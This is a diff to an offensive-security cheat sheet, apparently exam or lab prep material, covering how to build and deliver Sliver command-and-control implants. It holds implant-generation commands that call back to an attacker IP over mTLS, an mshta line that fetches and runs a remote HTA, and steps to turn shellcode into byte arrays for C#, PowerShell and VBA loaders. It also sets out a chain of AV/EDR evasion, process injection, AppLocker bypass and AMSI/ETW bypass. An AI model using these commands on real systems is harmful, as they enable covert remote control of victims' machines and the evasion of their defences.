@@ -80,17 +80,15 @@ Deliver: `mshta.exe http://<IP>/red.hta`
 ## 2. Generate shellcode (Sliver)
 
 ```bash
-# C# loaders (aes-loaders/, cs-loaders/) — emits a byte[] directly
-sliver > generate --mtls <IP>:8888 --format csharp --save /tmp/sc.cs
-
-# PowerShell runner (ps-shellcode-runner.ps1)
-sliver > generate --mtls <IP>:8888 --format ps1 --save /tmp/sc.ps1
-
 # Raw PIC shellcode (→ encrypt, or → NimSyscallPacker)
 sliver > generate --mtls <IP>:8888 --format shellcode --save /tmp/sc.bin
 
+# Convert to C# / PowerShell byte arrays for the loaders:
+python3 sliver/sliver2arrays.py /tmp/sc.bin --csharp   # aes-loaders/, cs-loaders/
+python3 sliver/sliver2arrays.py /tmp/sc.bin --ps1      # ps-shellcode-runner.ps1
+
 # Standalone EXE (→ NimSyscallPacker, or direct delivery)
-sliver > generate --mtls <IP>:8888 --format raw --save /tmp/implant.exe
+sliver > generate --mtls <IP>:8888 --format exe --save /tmp/implant.exe
 ```
 
 ### Situation: the injected blob must stay small (tight VBA / shellcode runner)
@@ -112,7 +110,7 @@ python3 sliver/sliver2arrays.py /tmp/sc.bin --vba      # VBA  Array(...)
 
 > **Rule of thumb:** full Sliver shellcode is MBs — only use it in C# runners that
 > allocate `shellcode.Length` (all loaders in this repo now do). For VBA macros,
-> use `--format csharp` output or a stager.
+> use `sliver2arrays.py --vba` output or a stager.
 
 ---
 
@@ -276,7 +274,7 @@ deprecated/unmaintained — test on a lab VM before exam day.
 ## One-line mental model
 
 1. **Recon** → macro phones home → know AppLocker + arch.
-2. **Generate** → `sliver > generate --mtls <IP>:8888 --format <csharp|ps1|shellcode|raw>`.
+2. **Generate** → `sliver > generate --mtls <IP>:8888 --format <exe|shared|service|shellcode>`; convert shellcode with `sliver2arrays.py`.
 3. **Obfuscate** → Caesar < XOR < AES as AV pressure rises.
 4. **Execute** → self-inject → remote-inject → hollowing → Nt* → APC → DInvoke → unhook, as EDR pressure rises.
 5. **AppLocker** → InstallUtil / msbuild / regsvr32. **PowerShell** → AMSI/ETW first.
